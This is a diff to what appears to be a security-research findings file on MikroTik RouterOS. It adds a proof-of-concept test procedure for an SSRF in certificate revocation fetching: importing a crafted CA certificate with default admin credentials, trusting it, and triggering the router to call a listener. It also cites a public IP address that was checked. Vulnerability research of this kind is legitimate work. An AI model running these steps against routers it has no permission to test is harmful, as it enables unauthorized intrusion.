@@ -264,6 +264,43 @@ SCEP_ENDPOINT = {
 }
 
 # ---------------------------------------------------------------------------
+# PoC status
+# ---------------------------------------------------------------------------
+
+POC_STATUS = {
+    'finding':      'MTIK-CERM-F01',
+    'tool':         '~/mikrotik-re/crl_ssrf_gen.py',
+    'status':       'TOOLING COMPLETE — live test pending',
+    'version_scope': 'RouterOS 7.x only (cerm + Nova bus; absent in 6.x)',
+    'version_confirmed_absent': '6.49.2 (185.109.248.85 — cerm daemon not present)',
+    'target_required': 'RouterOS 7.24.2 CHR or physical device',
+    'listener_constraint': (
+        'Listener must be reachable from router IP at time of test. '
+        'LAN: use 192.168.1.124 if CHR is on bridged interface. '
+        'WAN: requires public VPS or ngrok tunnel.'
+    ),
+    'test_steps': [
+        '1. Boot CHR 7.24.2: qemu-system-x86_64 -hda chr-7.24.2.qcow2 -m 256M -net nic,model=virtio -net tap',
+        '2. python3 crl_ssrf_gen.py --listener 192.168.1.124:8080 --out ca_ssrf.pem --listen',
+        '3. scp ca_ssrf.pem admin@<router-ip>: (default creds admin/blank)',
+        '4. SSH to router: /certificate import file-name=ca_ssrf.pem passphrase=""',
+        '5. /certificate set [find name=SSRF-Test-CA] trusted=yes',
+        '6. /certificate check-revocation SSRF-Test-CA  (explicit trigger)',
+        '7. Observe HTTP GET /crl/1.crl at listener — SSRF CONFIRMED',
+    ],
+    'chr_download': 'https://download.mikrotik.com/routeros/7.24.2/chr-7.24.2.img.zip',
+    'expected_request': 'GET /crl/1.crl HTTP/1.1\\r\\nHost: <listener-ip>:<port>',
+    'alternative_triggers': [
+        '/ip service set www-ssl certificate=SSRF-Test-CA',
+        'Any TLS handshake that triggers certificate chain validation',
+    ],
+    'fallback_trigger': (
+        'If explicit check-revocation is not available in 7.24.2 CLI, '
+        'assign cert to a service (www-ssl or api-ssl) and initiate a TLS connection.'
+    ),
+}
+
+# ---------------------------------------------------------------------------
 # Findings
 # ---------------------------------------------------------------------------
 
@@ -315,7 +352,13 @@ FINDINGS = [
             '(4) Use a timeout and byte limit on CRL HTTP response to prevent stall attacks. '
             'Short-term: log all outbound CRL fetch attempts with the certificate issuer.'
         ),
-        'status': 'CONFIRMED (code path traced: AIA extract → URI build → HTTP connect)',
+        'status': (
+            'CONFIRMED (code path traced: AIA extract → URI build → HTTP connect). '
+            'PoC tooling complete: ~/mikrotik-re/crl_ssrf_gen.py. '
+            'Live test pending: requires RouterOS 7.x instance. '
+            'Version scope: 7.x only (cerm absent in 6.x — verified on 185.109.248.85 / 6.49.2). '
+            'See POC_STATUS for test procedure.'
+        ),
         'cve': None,
     },
     {
